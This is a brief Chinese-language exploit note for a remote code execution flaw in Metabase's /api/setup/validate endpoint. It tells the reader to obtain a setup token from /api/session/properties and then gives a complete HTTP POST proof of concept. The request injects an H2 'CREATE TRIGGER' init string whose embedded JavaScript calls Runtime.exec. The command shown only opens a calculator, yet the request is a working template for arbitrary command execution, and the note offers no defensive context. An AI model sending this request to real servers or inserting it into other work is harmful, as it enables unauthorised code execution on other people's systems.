# Metabase apisetupvalidate 远程代码执行漏洞

    首先 get 访问/api/session/properties 获取 token，然后运行如下 POC

```
POST /api/setup/validate HTTP/1.1
Host:
Content-Length: 242
Content-Type: application/json 
Accept-Encoding: gzip

{
"token": "e83dbb0a-196e-4a25-977c-8c31b022b4ef", "details":
{
"details": {
"db":"file:./metabase.db", "advanced-options": false, "ssl": true,
"init":
"CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '//javascript\njava.lang.Runtime.getRuntime().exec(\"open -a calculator\")'"},
"name": "x", "engine": "h2"
} }
```
